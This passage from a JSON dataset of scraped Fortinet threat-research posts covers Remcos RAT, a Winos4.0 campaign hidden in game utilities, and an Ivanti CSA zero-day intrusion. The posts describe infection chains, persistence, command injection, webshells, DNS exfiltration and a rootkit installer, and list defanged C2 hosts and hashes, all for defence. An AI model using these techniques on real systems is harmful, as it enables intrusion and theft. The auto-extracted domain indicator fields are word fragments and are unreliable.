Code. Execution”. FortiGuard Antivirus servicedetects the original Excel document, the HTA file, the downloaded executable file, the data/script files and the Recom executable file with the following AV signatures. MSExcel/CVE-2017-0199. REM!exploitJS/Remcos. CB!tr.dldrPowerShell/Remcos. SER!trData/Remcos. LAV!trW32/Remcos. LD!tr FortiGate, FortiMail, FortiClient, and FortiEDR support the FortiGuard AntiVirus service. The FortiGuard AntiVirus engine is part of each solution. As a result, customers who have these products with up-to-date protections are already protected. The FortiGuard CDR (content disarm and reconstruction) service can disarm the embedded link object inside the Excel document. To stay informed of new and emerging threats, you cansign upto receive future alerts. We also suggest our readers go through the freeNSE training:NSE 1 – Information Security Awareness, a module on Internet threats designed to help end users learn how to identify and protect themselves from phishing attacks. If you believe this or any other cybersecurity threat has impacted your organization, please contact ourGlobal FortiGuard Incident Response Team. hxxps://og1[.]in/2Rxzb3hxxp://192[.]3[.]220[.]22/xampp/en/cookienetbookinetcahce.htahxxp://192[.]3[.]220[.]22/hFXELFSwRHRwqbE214.binhxxp://192[.]3[.]220[.]22/430/dllhost.exe 107[.]173[.]4[.]16:2404 [PO-9987689987.xls]4A670E3D4B8481CED88C74458FEC448A0FE40064AB2B1B00A289AB504015E944 [cookienetbookinetcahce.hta]F99757C98007DA241258AE12EC0FD5083F0475A993CA6309811263AAD17D4661 [dllhost.exe / Vaccinerende.exe]9124D7696D2B94E7959933C3F7A8F68E61A5CE29CD5934A4D0379C2193B126BE [Aerognosy. Res]D4D98FDBE306D61986BED62340744554E0A288C5A804ED5C924F66885CBF3514 [Valvulate. Cru]F9B744D0223EFE3C01C94D526881A95523C2F5E457F03774DD1D661944E60852 [Remcos / Decrypted hFXELFSwRHRwqbE214.bin]24A4EBF1DE71F332F38DE69BAF2DA3019A87D45129411AD4F7D3EA48F506119D FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "metadata": {
      "url": "https://www.fortinet.com/blog/threat-research/new-campaign-uses-remcos-rat-to-exploit-victims",
      "scraped_at": "2025-07-20T13:45:30.907533",
      "indicators": {
        "ip_address": [],
        "domain": [
          "FXELFSwRHRwqbE214",
          "owerShell",
          "eg",
          "shta",
          "LE",
          "llhost",
          "accinerende",
          "ookienetbookinetcahce",
          "r",
          "md",
          "O-9987689987",
          "owershell"
        ],
        "hash_md5": [],
        "hash_sha1": [],
        "hash_sha256": [
          "9124D7696D2B94E7959933C3F7A8F68E61A5CE29CD5934A4D0379C2193B126BE",
          "4A670E3D4B8481CED88C74458FEC448A0FE40064AB2B1B00A289AB504015E944",
          "24A4EBF1DE71F332F38DE69BAF2DA3019A87D45129411AD4F7D3EA48F506119D",
          "F9B744D0223EFE3C01C94D526881A95523C2F5E457F03774DD1D661944E60852",
          "D4D98FDBE306D61986BED62340744554E0A288C5A804ED5C924F66885CBF3514",
          "F99757C98007DA241258AE12EC0FD5083F0475A993CA6309811263AAD17D4661"
        ],
        "cve": [
          "CVE-2017-0199"
        ],
        "email": [],
        "url": []
      },
      "threat_score": 0.266825965750697
    }
  },
  {
    "id": "Fortinet_58776",
    "source": "Fortinet",
    "title": "Threat Campaign Spreads Winos4.0 Through Game Application",
    "text": "FortiGuard Labs Threat Research Affected Platforms:Microsoft WindowsImpacted Users:Microsoft WindowsImpact:Compromised machines are under the control of the threat actorSeverity Level:Medium Winos4.0 is an advanced malicious framework that offers comprehensive functionality, a stable architecture, and efficient control over numerous online endpoints to execute further actions. Rebuilt from Gh0strat, it includes several modular components, each handling distinct functions. Winos4.0 has been deployed in various attack campaigns, such as Silver Fox. FortiGuard Labs has identified multiple samples of this malware hidden within gaming-related applications, including installation tools, speed boosters, and optimization utilities. Analysis of the decoded DLL file reveals a potential targeting of the education sector, as indicated by its file description, “校园政务” (Campus Administration). In this blog post, we will delve into a comprehensive technical analysis of a campaign that leveraged these applications to deliver Winos4.0. Initial access is achieved by distributing game-related applications designed for optimization or installation. After the victim runs the application, it retrieves a fake BMP file from the server ad59t82g[.]com. The file is then XOR decoded, extracting the DLL “you.dll,” which is loaded through its export function “you” to proceed to the next stage. This DLL file is responsible for setting up the execution environment. It begins by downloading three files from the same remote path “hxxp://ad59t82g[.]com/1/” used in the previous stage. A folder with a random name is then created in “C:\\Program Files (x86),” where” text.bmp” is saved as “t3d.tmp,” “d.bmp” as “t4d.tmp,” and “t2.bmp” as “t5d.tmp.” It then extracts “t3d.tmp” using the password “lalala123%,” obtaining three clean files: u72kOdQ.exe, MSVCP140.dll, and VCRUNTIME140.dll. Next, it decodes “t4d.tmp” with XOR key 0x67080000 to reveal the main malicious file, “libcef.dll.” The purpose of the three extracted files is to load “libcef.dll” to inject shellcode. The DLL is named “学籍系统,” meaning “Student Registration System,” suggesting that the threat actor may be targeting educational organizations. Next, It checks for the presence of a window with the specific class name “Q360SafeMonClass.” If the window is not found, it proceeds to establish persistence by adding the executable “u72kOdQ.exe” to the registry key “SOFTWARE\\\\MICROSOFT\\\\WINDOWS\\\\CURRENTVERSION\\\\RUN” under the name “WINDOWS.” It then loads the “Shell32” library and calls “ShellExecuteA” to execute u72kOdQ.exe. If the window “Q360SafeMonClass” is present, it transfers to setting a scheduled task. It downloads another encoded file, “hxxp://ad59t82g[.]com/1/h[.]bmp.” The XOR-decoded result is an MSIL file embedded with a Base64-encoded command. The decoded command intends to create a scheduled task named “Window Defender Uqdata” that executes a specified command (execute “u72kOdQ.exe”) starting one minute from the current time, with a repetition interval of one minute and configured to restart up to three times if necessary. The task runs with the highest privileges (RunLevel 1). Following the persistence setup, the malicious DLL “libcef.dll” decodes “t5d.tmp” using an XOR key 0x67080000. Once decoded, it injects the extracted shellcode, preparing it to execute actions within the compromised environment. The shellcode dynamically loads APIs, as shown in Figure 13. The shellcode retrieves configuration data by searching for the marker string “codecode,” a change from the previous version, which used the string “codemark” for this purpose. The malware retrieves the C2 address 202[.]79[.]173[.]4 and port 80, establishing a connection using the TCP protocol (t1:1). It sends “x32” to the C2 for module downloading, which serves to check in the victim. The downloaded module consists of encrypted data with a size of 0x4B00E. The data is decrypted using a simple XOR operation with the key value of 0x2B. The decrypted 32-bit module is “上线模块.dll.” It is then executed, leading to the next stage. The modules described in the following sections are all components of Winos4.0. They facilitate online functionality, including logging in and checking in with the server. Additionally, they enable the retrieval of C2 commands and downloading modules. The entry first calls a function to check whether the value of the registry key “HKEY_CURRENT_USER\\\\Console\\\\IpDate” is valid. This value will later be used to update the main server address in the subsequent payload downloaded via C2. Once it confirms that it can reach the C2 server, it then downloads encoded data from its C2. It saves the XOR-decoded results in the registry “HKEY_CURRENT_USER \\\\Console\\\\0\\\\ d33f351a4aeea5e608853d1a56661059.” Once the module is configured for the next stage, the C2 server address information is recorded in the registry key “HKEY_LOCAL_MACHINE\\\\SOFTWARE\\\\IpDates_info.” This module is responsible for information collection, environment checks, and core backdoor functionality. Its functions include: During this campaign's attack, we retrieved two plugins from the command and control (C2) server, which are stored in the registry under the key “HKEY_CURRENT_USER\\\\Console\\\\0.” These modules are specifically designed to capture screenshots and manage documents. Upon receiving directives from the C2 server, these plugins facilitate uploading documents from the compromised system, enabling the attacker to gather sensitive information and discreetly monitor activities. Winos4.0 is a powerful framework, similar to Cobalt Strike and Sliver, that can support multiple functions and easily control compromised systems. Threat campaigns leverage Game-related applications to lure a victim to download and execute the malware without caution and successfully deploy deep control of the system. The entire attack chain involves multiple encrypted data and lots of C2 communication to complete the injection. Users should be aware of any new application's source and only download the software from qualified sources. The malware described in this report is detected and blocked byFortiGuard Antivirusas: W32/Agent. HUJ!tr.dldrW32/Agent. NJD!trData/Agent.3A23!trW32/Agent.501F!trMSIL/Agent.93AB!trW32/Agent. DCO!trW32/Agent. SS!tr FortiGate, FortiMail, FortiClient, and FortiEDR support the FortiGuard AntiVirus service. The FortiGuard AntiVirus engine is part of each of these solutions. As a result, customers who have these products with up-to-date protections are protected. TheFortiGuard Web Filtering Serviceblocks the C2 servers and downloads URLs. We also suggest that organizations go through Fortinet’s free training module:Fortinet Certified Fundamentals (FCF) in Cybersecurity. This module is designed to help end users learn how to identify and protect themselves from phishing attacks. FortiGuard IP ReputationandAnti-Botnet Security Serviceproactively block these attacks by aggregating malicious source IP data from the Fortinet distributed network of threat sensors, CERTs, MITRE, cooperative competitors, and other global sources that collaborate to provide up-to-date threat intelligence about hostile sources. If you believe this or any other cybersecurity threat has impacted your organization, please contact ourGlobal FortiGuard Incident Response Team. hxxp://ad59t82g[.]com/1/lon2[.]bmphxxp://ad59t82g[.]com/1/text[.]bmphxxp://ad59t82g[.]com/1/d[.]bmphxxp://ad59t82g[.]com/1/t2[.]bmphxxp://ad59t82g[.]com/1/h[.]bmp ad59t82g[.]com202[.]79[.]173[.]4 c9817d415d34ea3ae07094dae818ffe8e3fb1d5bcb13eb0e65fd361b7859eda7 NetDiagnotor.exe (天谕客户端检测工具)284cf31ebb4e7dc827374934ad0726f72e7aaef49cadc6aa59d2a2ff672d3fe8 gpatchex.exe (梦幻西游更新程序)b2a3aaf4eb4deb85462e1ee39c84caf2830091c1bff8014ad13147897b25e24c Duoyi (战盟安装程序)b763d77b7aaa83d6c4a9e749cd3c7638127e755d3dc843b15b6c4afce1f468b5 劲舞团联合登录器.exe (窗口化)dcdbc3b246233befa25b67909a01b835f1875f4047875ef13f1b801cd2da6fcd Duoyi (战盟安装程序)3fae0495fd0acc7722c2482c0ef3c6ab9ee41acbcaac46a8933c7b36b8896378 crashreporter.exef41236ab5ceffc5379fcf444de358cbc6f67beb31d0e0fd3f7ed0f501eb740ff yxqxunyou.exe (英雄联盟优化)80b1d6411e29e51e54f20f46856d31b28e087e9244693e65d022b680c4ba00ce 劲舞团联合登录器.exe (窗口化)1a48347f5fc7c63cc03f30810f961133bd3912caf16ac403e11bc3491117181d manualupdate.exe (天谕手动更新工具)8748bb7512f16f8122779171686abe0fa0060f1126298290e240457dc90d0aa7 MatRepair.exe (反恐行动客户端修复程序)1354796b44239eef177431584848029161c232401a9580481dbfb5196465250e you.dllbef32532923903b12f04b54dd06ec81661f706c3b1397bc77c45492db3919248 you.dll033965f3063bc2a45e5bd3a57ffce098b9308668d70b9b3063f066df5f3e55dd you.dll922512203c7b9fa67e8db2f588ff4945f63e20c4bc0aafccdba749a442808ace you.dll04edb6585118d09205ee693a54249ed68ebbf68b3fc3d711d2aa0c815b7b3a23 shellcode51c7f320b95a64bcff050da86c7884bb4f89a5d00073d747f0da7345c8a4501f 学籍系统.dllff0c28c81cd0afd78f78c79863c9f4c8afd9d3877a213dfc2dbb55360b7d93ab ConsoleApp2.exea27dc6e5aea0c3168117cfde2adb01f73f20881fc6485b768915216c46115064 差异屏幕.vll8f0079a41a262536f502b4b57473effd6ab7955bc2d6e99e0910df18e990a9f6 文件管理.vll37104f3b3646f5ffc8c78778ec5fdc924ebb5e5756cb162c0e409d24bedf406d 上线模块.dll (online module)a30b68ed39c1517d10b747c2fcd7a72cb12dc8f434203243e7c50df0e56d17d0 登录模块.dll (login module) FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "metadata": {
      "url": "https://www.fortinet.com/blog/threat-research/threat-campaign-spreads-winos4-through-game-application",
      "scraped_at": "2025-07-20T13:45:38.951284",
      "indicators": {
        "ip_address": [],
        "domain": [
          "",
          "ibcef",
          "72kOdQ",
          "xqxunyou",
          "SVCP140",
          "ou",
          "3d",
          "2",
          "etDiagnotor",
          "patchex",
          "anualupdate",
          "ext",
          "4d",
          "CRUNTIME140",
          "5d",
          "atRepair"
        ],
        "hash_md5": [
          "d33f351a4aeea5e608853d1a56661059"
        ],
        "hash_sha1": [],
        "hash_sha256": [
          "1a48347f5fc7c63cc03f30810f961133bd3912caf16ac403e11bc3491117181d",
          "dcdbc3b246233befa25b67909a01b835f1875f4047875ef13f1b801cd2da6fcd",
          "284cf31ebb4e7dc827374934ad0726f72e7aaef49cadc6aa59d2a2ff672d3fe8",
          "80b1d6411e29e51e54f20f46856d31b28e087e9244693e65d022b680c4ba00ce",
          "3fae0495fd0acc7722c2482c0ef3c6ab9ee41acbcaac46a8933c7b36b8896378",
          "1354796b44239eef177431584848029161c232401a9580481dbfb5196465250e",
          "b2a3aaf4eb4deb85462e1ee39c84caf2830091c1bff8014ad13147897b25e24c",
          "c9817d415d34ea3ae07094dae818ffe8e3fb1d5bcb13eb0e65fd361b7859eda7",
          "8748bb7512f16f8122779171686abe0fa0060f1126298290e240457dc90d0aa7",
          "b763d77b7aaa83d6c4a9e749cd3c7638127e755d3dc843b15b6c4afce1f468b5",
          "a30b68ed39c1517d10b747c2fcd7a72cb12dc8f434203243e7c50df0e56d17d0"
        ],
        "cve": [],
        "email": [],
        "url": []
      },
      "threat_score": 0.7056638811513465
    }
  },
  {
    "id": "Fortinet_86632",
    "source": "Fortinet",
    "title": "Burning Zero Days: Suspected Nation-State Adversary Targets Ivanti CSA",
    "text": "FortiGuard Labs Threat Research Affected Platforms:Ivanti Cloud Services Appliance version 4.6 and priorImpacted Users:Any organizationImpact:Remote attackers gain control of the vulnerable systemsSeverity Level:Critical Today FortiGuard Labs is releasing this blog post about a case where an advanced adversary was observed exploiting three vulnerabilities affecting the Ivanti Cloud Services Appliance (CSA). At the time of our investigation, two out of the three identified vulnerabilities were not publicly known. This incident is a prime example of how threat actors chain zero-day vulnerabilities to gain initial access to a victim’s network. In a recent incident response engagement, FortiGuard Incident Response (FGIR) services were engaged by a customer to investigate malicious communication originating from their network. During the investigation, FGIR came across an adversary who had gained access to the customer’s network by exploiting the CVE-2024-8190 and two previously unknown vulnerabilities affecting the PHP front end of the Ivanti CSA appliance. The incident was detected by the customer on September 9, 2024, when some of its internal systems were found to be communicating to a malicious IP address,206[.]189[.]156[.]69. FGIR was engaged the next day. During the IR investigation, FGIR observed that the threat actor exploited the vulnerability CVE-2024-8190 in conjunction with the following two previously publicly unknown vulnerabilities: These resources are located under the root folder of the PHP web front, which serves as the management console of the CSA. On September 19, 2024, FGIR disclosed to Ivanti’s security team the discovery of the two new vulnerabilities. During the meeting, the Ivanti team claimed that they were aware and tracking the two publicly unknown exploited vulnerabilities. On September 19, Ivanti published the advisory for CVE-2024-8963, which addressed the path traversal vulnerability. On September 10, 2024, at 14:00:02, Ivanti published the security advisoryCVE-2024-8190on their forum. The advisory informed about the discovery of an authenticated command injection vulnerability in theDateTimeTab.phpresource, affecting CSA 4.6 with patch 518 and earlier versions. On September 13, 2024, the CVE-2024-8190 vulnerability was added to the CISA’s Known Exploited Vulnerabilities list. On the same date, Ivanti updated their security advisory to mention that, following public disclosure of the September 10th, exploitation of the command injection vulnerability had been observed in the wild. On September 16, 2024, the research team at Horizon3.ai publishedthe detailsrelated to the CVE-2024-8190 vulnerability and also released a proof of concept exploit code. During the incident response investigation, FGIR observed that the threat actor exploited a path traversal vulnerability on the resource/client/index.phpto gain unauthorized authenticated access to the resource/gsb/users.phpby sending the following web request: The first of such requests was sent by the threat actor on September 4, 2024, at 06:53:14 UTC, right before the exploitation of the command injection vulnerability, affecting the resource/gsb/reports.php. The resource/client/index.phpon the PHP web front of the Ivanti CSA appliance can be accessed by unauthenticated users to download the “LANDESK Remote Assistance Client” software package. The following picture shows how the resource/client/index.phplooks when opened in a browser: Upon inspecting the /client/index.php’s code, FGIR discovered that, by clicking the “Install now” button present on it, the user is redirected to a resource called /client/download.php: The resource/client/download.phpredirects the user to the pageOnDemand.phpvia the header function. The resource/client/OnDemand.phpcontains the code to open a local file calledLDSupport.exe, using the php functionpopen. The local fileis served to the user via the phpechocommand. The threat actor sent a malformed URL to the resource/client/index.php,by inserting%3F.phpat the end of the URI, and appended the URL with the location of the php resource to be accessed through path traversal. Using this technique, the threat actor managed to access the resource/gsb/users.php. The appended resource,/gsb/users.php, was assigned to the variable$filenamein the/client/OnDemand.phpcode, which led to the path traversal vulnerability, allowing the threat actor to view the list of users configured in the CSA appliance. FGIR simulated the exploitation of this vulnerability in its lab environment to understand what information could be acquired with it and the figure below shows the resulting output, which includes the list of users configured on the test appliance: The threat actor exploited this vulnerability several times over the course of their intrusion to access other resources as well, with connections originating from various IP addresses. As seen in the screenshot below, which has all times expressed using the timezone UTC-007, the threat actor used the same vulnerability to access the resource/gsb/datetime.phpas well. FGIR states with medium confidence that the threat actor exploited this path traversal vulnerability to gain access to the resource/gsb/users.phpnot only to list users, but also to attempt to create rogue users and gain authenticated access to the CSA web front end. Themessageslogs contain evidence of the threat actor creating two users:aiadminandservices, using the CSA utility calleddbtool. This was likely performed to maintain persistent, authenticated access to the CSA management console. After the threat actor exploited the path traversal vulnerability and enumerated users configured on the CSA appliance, they exploited CVE-2024-8190, the command injection vulnerability affecting the resource /gsb/DateTimeTab.php, to attempt to access the credentials of those users. FGIR observed evidence of this exploitation in Ivanti’s broker logs, as seen in the snippet below. FGIR has high confidence that the threat actor exploited this vulnerability to gain access to the user,admin’s credentials and use these privileged credentials to carry out the authenticated exploitation of the command injection vulnerability in/clients/reports.phpresource. FGIR found the text “rewritten with new timezone” within the functionsetPhpTimeZone($timezoneinfo)of the resourceDateTimeTab.php. From the above systemLog function call, it is clear that the value of the variable, $timezone was the one that was manipulated by the threat actor. Tracing back the value of this variable shows that it was deduced from the parameter$timezoneinfo, which was passed to the functionsetPhpTimeZone. Tracing back where thesetPhpTimeZonewas called, FGIR found that this happened within the functionhandleDateTimeSubmit(&$msg). This function is responsible for handling change submissions when the “Save” button is clicked, as depicted in the screenshot below. The value of a global variable, $TIMEZONE, which was passed as a variable to the functionsetPhpTimeZone, was received from the POST request variableTIMEZONE. This implies that the threat actor crafted and sent a malicious POST request toDateTimeTab.php, with the malicious command passed in the POST request variableTIMEZONE. Going back to the malicious command injected by the threat actor, FGIR decoded the base64 blob, which resulted in the following Python code: The script extracts the password of the usergsbadminfrom the file/opt/landesk/broker/broker.confand assigns its value to the environment variablePGPASSWORD. The code targets the latest backup file in the/backupsdirectory and iterates through this directory to find the latest backup file. If it finds one, then it connects to the Postgres database using thegsbadmincredentials, extracts the password of the useradminfrom the tableuser_info,and assigns it to the environment variablePGPASSWORD. The script then decompresses the latest backup file, and then iterates through the files to search for a filename that satisfies the regular expressionphp\\w{6}, basically looking for a filename containing the stringphpfollowed by six characters (letters or numbers only). In case it finds such a file, it changes the permissions of the file so thateveryonehas the right to read, write, and execute it. The script then reads the private key from the backup file of the userroot, encodes it using base64, and then assigns the resultant value to the columnorganizationin the Postgres database table,user_info. While assessing the backend Postgres database logs, FGIR found confirmation of successful exploitation of this command injection vulnerability, as seen in the screenshot below: Once the threat actor extracted the credentials of the usersgsbadmin, admin, and the private key of the userroot,they used the stolen credentials to perform authenticated exploitation of the publicly unknown command injection vulnerability affecting the resource/gsb/reports.php. Some of the threat actor requests can be seen in the messages and audit logs below: Command injection was found to be exploited in the following format, where a php script/subin/tripwirewas executed with the parameter–update,followed by a semicolon and a malicious command. The first malicious command injected by the threat actor was used to create a web shell calledhelp.phpin the CSA webroot folder under the/gsbdirectory. FGIR looked at the code of the resourcereports.phpand identified the vulnerability in the line highlighted below in yellow. The script accepts the value of the POST parameterTW_IDand passes it as a parameter to the script/subin/tripwire, without sanitization. The resource/sbin/tripwireis a PHP wrapper for the binary/usr/sbin/tripwire, which is used to create security reports, when initiated through the gsb/reports.phpresource. This is a legitimate functionality of the Ivanti CSA portal. FGIR inspected the tripwire PHP wrapper script and found the functionupdatewhich passes the command directly to the installed tripwire binary without sanitization. Since the tripwire PHP wrapper runs withsudoprivileges, the injected command also runs with elevated privileges. FGIR acquired the patch for CVE-2024-8190, and while analyzing the functionality of the patch, FGIR assessed that the file,reports.phpwas not in the patch script, nor was it listed as a file in the patch folder, leading FGIR to conclude that the command injection vulnerability found in the resource/gsb/reports.phpwas not addressed in that patch. On September 10, 2024, when the advisory for CVE-2024-8190 was published by Ivanti, the threat actor, still active in the customer’s network, “patched” the command injection vulnerabilities in the resources/gsb/DateTimeTab.php, and/gsb/reports.php, making them unexploitable. In the past, threat actors have been observed to patch vulnerabilities after having exploited them, and gained foothold into the victim’s network, to stop any other intruder from gaining access to the vulnerable asset(s), and potentially interfering with their attack operations. In this case, the threat actor downloaded the patched version of the two vulnerable resources fromtemp[.]shand saved them as/tmp/1on disk, before moving them to the webroot folder and overwriting the vulnerable version of the files with them. Below are the relevant commands: The modified timestamps of the resourcesreports.php, andDateTimeTab.phpwere September 10, 2024, at 12:37:23 UTC and 13:06:10 UTC, respectively, as seen in the screenshots below. Comparing the original vulnerable version ofreports.phpto the version patched by the threat actor, shows that the threat actor added a piece of code to replace the semicolon with an underscore in the POST parameterTW_ID, so that command injection using the semicolon is not possible anymore. FGIR tested the patching in a lab environment and confirmed that the modification by the threat actor does indeed make the resourcereports.phpunexploitable after the patch. The screenshot below shows the directorytestwithoutfixwas successfully created by exploiting the command injection vulnerability on the original vulnerable version ofreports.php. When the fix is applied to thereports.phpfile and the command injection is exploited again, the directorytestwithfixis not created. The threat actor also patched the fileDateTimeTab.phpusing the samestr_replacefunction to replace any semicolon in the POST parameterTIMEZONE, with an underscore, rendering the command injection vulnerability using this parameter ineffective. After compromising the internet-facing Ivanti CSA appliance, the threat actor exploited the CVE-2024-29824 SQL Injection vulnerability on Ivanti’s backend SQL database server (SQLS). Sample malicious POST requests exploiting this vulnerability are depicted below. The threat actor enabled thexp_cmdshellstored procedure via the exploitation and used this stored procedure to attain remote code execution on the SQLS system. The threat actor created an account calledmssqlsvcon the compromised system SQLS and turned off the host firewall. FGIR also observed that the threat actor ran some basic reconnaissance commands on theSQLSsystem and attempted to exfiltrate the reconnaissance output using the following PowerShell command: This is a technique used to exfiltrate data over the DNS protocol. The technique is also known asDNS tunneling. See below for the content of the file that the threat actor tried to exfiltrate: FGIR discovered more tactics and techniques used by the threat actor during their intrusion. FGIR extracted and decoded some interesting commands executed by the threat actor from the Linux audit logs and other sources. A sample of those commands are shown in the table below: During the course of their operations, the threat actor created several webshells. They also modified the legitimate resource,syslog.php,and appended malicious code to it, to use it as a web shell. Some of the web shells found are shown in the table below. On September 11, at 04:12:00 UTC, the threat actor started an authentication brute force attack against the customer’s internal network assets, using a dictionary attack. FGIR discovered that the threat actor downloaded a tar file calledufrom atemp[.]shURL. This tar file contained three files:brokes, passdic.txt, andu.txt. The filebrokesis a Linux ELF binary, which was used to perform the brute force attack on customer’s network assets. It is likely thatbrokesused as parameters the list of customer’s users, possibly harvested during a different campaign, in the form of the fileu.txtand the password filepassdic.txt. The threat actor downloaded an unknown file calledtargetfromtemp[.]sh, however this one was not found on the disk. The threat actor also downloaded a shell script calleds.sh, from thetemp[.]shsite. This script was used to execute thebruteforcebinarybrokesand anonymous logins were attempted on LDAP’s port TCP 389 of the attacked assets with several passwords. During the memory analysis of the CSA appliance, FGIR discovered traces of the use of an open-source go-based proxy tool calledReverseSocks5, which was downloaded and used by the threat actor to perform scanning and brute force attacks on the customer’s internal network, while proxying the traffic through the CSA appliance. The string, which was created in the memory due to an error thrown by the tool, can be seen in the below snippet. Some other suspicious strings found during the analysis of the memory included some PHP variables found to be populated with suspicious values: ZjmgmXsB.phpwas a webshell, which the threat actor was interacting with, while accessing it from the IP address208[.]105[.]190[.]170. During the investigation, FGIR discovered that on September 7, 2024, at 03:26:17 UTC, the threat actor attempted to deploy a rootkit in the form of a Linux kernel object (KO) module on the CSA appliance. This attempt was found in the audit logs as seen in the snippet below: The likely motive behind this was for the threat actor to maintain kernel-level persistence on the CSA device, which may survive even a factory reset. This activity is in line with the public reporting on the compromise of Ivanti CSA appliances, which is availablehereandhere. FGIR decoded the hex string contained in the snippet above and obtained a base64 encoded blob. The initial part of the resultant base64 encoded blob indicates that this is a compressed archive file. Decompressing the tar file results in the following two files. The fileinstall.shis a malicious bash script that installs a malicious kernel object calledsysinitd.ko. The compressed archive file was corrupted and only the fileinstall.shcould be retrieved successfully in its entirety, while the filesysinitdwas truncated, and the filesysinitd.kowas missing. FGIR pivoted to the disk image of the CSA appliance and found thesysinitdandsysinitd.kofiles in the location/usr/share/empty/init/. The scriptinstall.shwas meant to install the malicious rootkitsysinitd.koon the affected system. The following variables were hard-coded in the scriptinstall.sh: The script starts with the following function call, which reads two parameters: The first parameter is the INSTALL_NAME string, which is used to rename the two files sysinitd andsysinitd.koto INSTALL_NAME and INSTALL_NAME.ko respectively. The second parameter is the path where the script copies the renamed version ofsysinitdandsysinitd.koto. In this case, the threat actor did not supply either of the two parameters. Therefore, the default namessysinitdandsysinitd.kowere used by the script. The following snippet of code checks if the install path exists and if not, then it creates it: The script then removes any installed kernel object with the name INSTALL_NAME.ko, using the commandrmmod, and then installs the malicious INSTALL_NAME.ko using the commandinsmod. The bash scriptinstall.shinstalls a persistence mechanism using the technique of adding an entry to install the malicious kernel object in therc.localandrc.d/rc.localfiles, if the malicious kernel object file is present on disk. FGIR aims to analyze the rootkit in detail and publish the findings in a follow-up blog post. The advanced adversaries were observed exploiting and chaining zero-day vulnerabilities to establish beachhead access in the victim’s network. You can read more about the Ivanti CSA zero-day attack in our Threat Signal Report:https://www.fortiguard.com/threat-signal-report/5556. The malware described in this report is detected and blocked byFortiGuard Antivirusas: BASH/Agent.030E!trELF/Agent.69A0!trELF/Agent.7E02!trELF/Agent. BD!tr FortiGate, FortiMail, FortiClient, and FortiEDR support the FortiGuard Antivirus service. The FortiGuard antivirus engine is a part of each of those solutions. As a result, customers who have these products with up-to-date protections are protected. Fortinet has also released the following IPS signatures to protect our customers from the threats contained in the report. CVE-2024-8190;https://www.fortiguard.com/encyclopedia/ips/56651 The interactsh related URLs are rated as “Malicious Websites” and “Malicious Activities Found” by the FortiGuard Web Filtering service. FortiGuard IP Reputation and Anti-Botnet Security Service proactively blocks these attacks by aggregating malicious source IP data from the Fortinet distributed network of threat sensors, CERTs, MITRE, cooperative competitors, and other global sources that collaborate to provide up-to-date threat intelligence about hostile sources. If you believe this or any other cybersecurity threat has impacted your organization, please contact our GlobalFortiGuard Incident Response Team. The MITRE ATT&CK framework has been used to refer to the various tactics and techniques used by the threat actor. Network Indicator apiv5[.]serverbks[.]xyz Domain associated with IP 156[.]234[.]193[.]18 74[.]62[.]81[.]162 Threat actor’s C2 189f31ed7d[.]ipv6[.]bypass[.]eu[.]org Seen in encoded PowerShell used by the threat actor iowxuintgredogzgblrsmr2cx2e471bor.oast[.]fun Seen in encoded PowerShell used by the threat actor o.lencr[.]org Let's Encrypt domain name c67f045c2f.ipv6.1433.eu[.]org Seen in encoded PowerShell used by the threat actor 206[.]189[.]156[.]69 oast[.]fun domain IP 51[.]91[.]79[.]17 temp[.]sh domain IP 156[.]234[.]193[.]18 C2 IP found in the python reverse shell 208[.]105[.]190[.]170 Threat actor IP interacting with webshell http://temp[.]sh/khkzg/DateTimeTab.php Patched version of DateTimeTab.php downloaded by the threat actor from this URL to overwrite the vulnerable version. http://temp[.]sh/vQuoW/reports.php Patched version reports.php downloaded by the threat actor from this URL to overwrite the vulnerable version. http://l8u6aolk4ejfsl9zeq6321zvwm2eq3[.]burpcollaborator.net Accessed by the threat actor 54[.]77[.]139[.]23 oastify[.].com subdomains 34[.]250[.]195[.]30 portswigger[.]net domain IP, web app security & testing 216[.]131[.]75[.]52 Threat actor IP interacting with webshell 24[.]166[.]100[.]255 Threat actor IP interacting with webshell 67[.]217[.]228[.]92 Threat actor IP interacting with webshell 69[.]49[.]88[.]235 Threat actor IP interacting with webshell 45[.]61[.]136[.]189 Threat actor IP interacting with webshell 3[.]248[.]33[.]252 Threat actor IP interacting with webshell 38[.]207[.]159[.]76 Threat actor IP interacting with webshell 193[.]189[.]100[.]197 Threat actor IP interacting with webshell 23[.]236[.]66[.]97 Threat actor IP interacting with webshell \\Device\\HarddiskVolume2\\ProgramData\\1.log Reconnaissance output \\Device\\HarddiskVolume2\\ProgramData\\bakeup.bat Unknown batch file \\Device\\HarddiskVolume2\\ProgramData\\output Reconnaissance output \\Device\\HarddiskVolume2\\ProgramData\\sess010981 Reconnaissance output C:\\inetpub\\wwwroot\\aspnet_client\\read.txt Unknown text file https://10.10.11.31/client/site.php Web shell on CSA appliance c:\\programdata\\output.hex Encoded reconnaissance output beb723a5f20a1a2c4375f9aa250d968d55155689 Bruteforcer binary passdic.txt passdic.txt List of passwords List of harvested usernames Files downloaded on the device are created as /tmp/1 on the CSA disk /tmp/systemd-private-2e4a6ea82da94a9b9fec37fe91c9b820-broker.service-asZTdm/tmp/.br/broke 64efc1aad330ea9d98c0c705e16cd4b3af7e74f8 Linux brute force binary /client/site.php Web shell on CSA appliance /gsb/client.php Web shell on CSA appliance /gsb/firewall.php firewall.php Web shell on CSA appliance /gsb/reports.php reports.php Web shell on CSA appliance /gsb/style.php Web shell on CSA appliance /gsb/syslog.php?a=phpinfo(); Web shell on CSA appliance /gsb/users.php Web shell on CSA appliance /gsb/uSxhmgm.php uSxhmgm.php Web shell on CSA appliance /gsb/ZjmgmXsB.php ZjmgmXsB.php Web shell on CSA appliance 8d016d02f8fbe25dce76481a90dd0b48630ce9e74e8c31ba007cf133e48b8526 Rootkit installation script /usr/share/empty/init/sysinitd.ko sysinitd.ko 6edd7b3123de985846a805931ca8ee5f6f7ed7b160144aa0e066967bc7c0423a Rootkit – Kernel Object Module /usr/share/empty/init/sysinitd d57a2cac394a778e19ce9b926f2e0a71936510798f30d20f207f2a49b49ce7b1 Malicious Linux binary zero-day vulnerability FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "metadata": {
      "url": "https://www.fortinet.com/blog/threat-research/burning-zero-days-suspected-nation-state-adversary-targets-ivanti-csa",
      "scraped_at": "2025-07-20T13:45:47.514361",
      "indicators": {
        "ip_address": [
